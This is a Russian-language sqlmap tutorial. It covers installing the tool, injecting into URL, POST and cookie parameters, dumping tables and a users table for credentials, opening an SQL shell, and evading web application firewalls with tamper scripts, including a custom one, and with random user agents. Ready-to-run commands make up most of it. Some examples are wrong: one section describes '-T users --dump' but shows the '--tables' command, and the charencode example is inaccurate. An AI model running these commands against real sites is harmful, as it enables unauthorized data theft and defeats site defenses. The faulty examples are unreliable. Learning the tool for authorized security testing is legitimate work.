## Установить SQLmap

#### Шаг 1: Получите операционную систему на базе Linux

Если вы собираетесь запустить SQLmap на Windows с Python, убедитесь, что у вас установлен Python, и перейдите к следующему шагу. В противном случае запустите свою систему Linux. Либо установите виртуальную машину Linux (рекомендуется Ubuntu или Kali) на Windows (Virtualbox / VMware / Parallels), либо загрузите свой рабочий стол Linux.

Если вы используете Microsoft Windows в качестве основной операционной системы, то удобно и просто запустить установку Ubuntu Linux (или [Kali Linux](https://kali.org/) ) на виртуальной машине. Затем вы можете поиграть с sqlmap, nmap, nikto и openvas вместе с сотней других мощных инструментов безопасности с открытым исходным кодом.

#### Шаг 2: Установка SQLmap

Python предустановлен в Ubuntu, поэтому все, что вам нужно сделать, это клонировать последний репозиторий из [git](https://github.com/sqlmapproject/sqlmap) и начать тестирование.

```
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

#### Меню справки и опции

Чтобы получить полный список справки и доступных опций:

```
python3 sqlmap.py -h
```

Чтобы отобразить **расширенную справку** и доступные параметры:

```
python3 sqlmap.py -hh
```

## Как использовать SQLmap

SQLMap обычно требует **параметры** для нацеливания на определенные части веб-приложения, где могут существовать уязвимости SQL-инъекции. Хотя SQLMap можно запустить против URL напрямую, часто эффективнее указать параметры для проведения точного тестирования.

Ниже приведен базовый пример использования SQLMap с URL-адресом `-u`и параметром. `id=5`Параметр проверяется на наличие SQL-инъекции.

#### Пример: простой тест на основе HTTP GET

```
python sqlmap.py -u 'http://mytestsite.com/page.php?id=5'
```

- SQLMap будет пытаться автоматически определить и эксплуатировать уязвимость

#### Указание метода HTTP-запроса

По умолчанию SQLMap использует GET-запросы, но вы можете использовать POST-запросы с помощью опции `--data`:

```    
python sqlmap.py -u "http://example.com/vulnerable.php" --data="id=1"
```

#### Дополнительные параметры

Уровень и риск:

- --level: Уровень тестирования (1-5). Увеличивает количество тестируемых параметров.
- --risk: Уровень риска (1-3). Увеличивает агрессивность тестирования

Сканирование всех параметров: SQLMap по умолчанию сканирует только указанный параметр, но вы можете указать ему сканировать все параметры:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --level=5 --risk=3
```

#### Использование прокси

Для анонимизации или мониторинга запросов можно использовать прокси:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --proxy="http://localhost:8080"
```

#### Получение данных из базы

Если SQLMap обнаружит уязвимость, вы можете получить данные из базы. `--dump`: Извлечение и отображение данных из базы данных.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dump
```

#### Пользовательские заголовки

Вы можете указать пользовательские заголовки:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --headers="User-Agent: Mozilla/5.0"
```
`
#### Автоматическое определение базы данных и пользователя

SQLMap может автоматически определить тип базы данных и имя пользователя:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --banner
```


#### Извлечь таблицы базы данных

SQLmap можно использовать для **тестирования и эксплуатации** SQL-инъекций, выполняя такие действия, как извлечение данных из баз данных, обновление таблиц и даже **запуск оболочек на удаленных хостах** , если все утки находятся в порядке.

Давайте извлечем таблицы из базы данных, используя уязвимость SQL Injection, которую мы подтвердили выше. Как вы увидите в выводе ниже, мы можем продолжить тестирование цели без необходимости повторного тестирования уязвимости. SQLmap использует известную ему информацию о сайте для дальнейшей эксплуатации целевой базы данных.

Для извлечения данных просто добавьте `--tables`параметр к предыдущей команде.

```
python sqlmap.py -u 'http://mytestsite.com/page.php?id=5' --tables
```

#### Сбор данных

Чтобы получить данные, мы просто расширяем нашу команду. Добавление `-T users`сосредоточится на таблице пользователей, где мы можем получить некоторые учетные данные. Добавление `--dump`скажет SQLmap извлечь все данные из таблицы пользователей, сначала будут перечислены столбцы, а затем данные будут выгружены из столбцов.

```
 python sqlmap.py -u 'http://mytestsite.com/page.php?id=5' --tables
```

#### Определение типа базы данных и пользователя

--banner: Получение информации о баннере базы данных.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --banner
```

#### Пользовательские заголовки:

--headers: Указание пользовательских заголовков HTTP.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --headers="User-Agent: Mozilla/5.0"
```

#### Cookie

--cookie: Указание значений cookie для отправки вместе с запросом.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --cookie="PHPSESSID=abc123"
```

#### Типы баз данных

--dbms: Указание конкретного типа базы данных, например MySQL, PostgreSQL.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dbms=mysql
```

#### SQL-коды

--sql-shell: Открывает оболочку для выполнения произвольных SQL-запросов.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --sql-shell
```

#### Выбор техник:

--technique: Указывает, какие техники SQL-инъекций использовать (B, E, U, Q, S, T).

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --technique=BEUST
```

#### Автоматический режим

**--batch**:  Этот параметр позволяет SQLMap работать в полностью автоматическом режиме, без запроса пользовательского ввода. Это полезно, когда вы хотите запустить SQLMap в фоновом режиме или в автоматизированных скриптах.

Пример использования:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --batch
```

#### Обход защиты

**--tamper**:  Этот параметр позволяет указать скрипты для обхода различных фильтров и WAF (Web Application Firewall). Скрипт space2comment заменяет пробелы в SQL-запросах комментариями, чтобы обойти фильтры, которые блокируют пробелы в SQL-запросах.

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --tamper=название_скрипта
```

Пример использования:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment
```

Вы можете указать несколько tamper-скриптов, разделяя их запятыми. Пример тестирование с несколькими tamper-скриптами:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --batch --tamper=space2comment,randomcase
```

Полезные tamper-скрипты

- space2comment: Заменяет пробелы комментариями.
- randomcase: Меняет регистр символов в SQL-запросах случайным образом.
- between: Добавляет "BETWEEN" выражение, чтобы обойти некоторые WAF.

Полный список доступных tamper-скриптов можно найти в директории tamper в папке с SQLMap, или используя команду:

```
python sqlmap.py --tamper=LIST
```

Эти параметры значительно расширяют возможности SQLMap, позволяя адаптировать его под различные сценарии и обойти защитные механизмы, которые могут применяться на целевом веб-приложении.

##### Примеры tamper-скриптов

Вот несколько tamper-скриптов и краткое описание их работы:

**space2comment.py:**

Заменяет пробелы на комментарии, чтобы обойти фильтры, которые блокируют пробелы.

```sql
SELECT * FROM users WHERE id=1
```

становится:

```
SELECT/**//* FROM/**/users/**/WHERE/**/id=1
```

**randomcase.py:**

Меняет регистр букв в SQL-запросах случайным образом, чтобы обойти фильтры, которые чувствительны к регистру.

```sql
SELECT * FROM users WHERE id=1
```

становится:

```sql
sElEcT * FrOm UsErS wHeRe Id=1
```

**between.py:**

Добавляет "BETWEEN" выражения в запросы, чтобы обойти некоторые фильтры.

```sql
SELECT * FROM users WHERE id=1
```

становится:

```sql
SELECT * FROM users WHERE id BETWEEN 0 AND 2
```

**charencode.py:**

Заменяет символы в SQL-запросе их Unicode-эквивалентами.

```sql
SELECT * FROM users WHERE id=1
```

становится:


```sql
SELECT * FROM users WHERE id=%31
```

**equaltolike.py:**

Заменяет оператор = на LIKE.

```sql
SELECT * FROM users WHERE username='admin'
```

становится:

```sql
SELECT * FROM users WHERE username LIKE 'admin'
```

**appendnullbyte.py:**

Добавляет нулевой байт (null byte) к каждому параметру.

```sql
SELECT * FROM users WHERE id=1
```

становится:

```sql
SELECT * FROM users WHERE id=1%00
```
##### Создание собственных tamper-скриптов

Вы также можете создать свои собственные tamper-скрипты. Для этого нужно создать Python-скрипт, который изменяет переданный SQL-запрос. Вот пример простого tamper-скрипта, который заменяет пробелы на комментарии:

```python
import re

def tamper(payload, **kwargs):
    if payload:
        return re.sub(r'\s+', '/**/', payload)
    return payload
```

Этот скрипт можно сохранить в файл с расширением .py и использовать его с SQLMap:

```
python sqlmap.py -u "http://example.com/vulnerable.php?id=1" --tamper=path/to/your/custom_script.py
```

Для получения полного списка доступных tamper-скриптов можно использовать команду:


```
python sqlmap.py --tamper=LIST
```
#### Блокировка брандмауэром веб-приложений - WAF

Попробуйте использовать другой пользовательский агент, а не sqlmap по умолчанию с `--random-agent`параметром.

```
python3 sqlmap.py -u "http://mytestsite.com/page.php?id=5" --random-agent
```


#### Дополнительные команды и опции:

Справка: Для получения списка всех опций и команд можно использовать:

```
python sqlmap.py --help
```

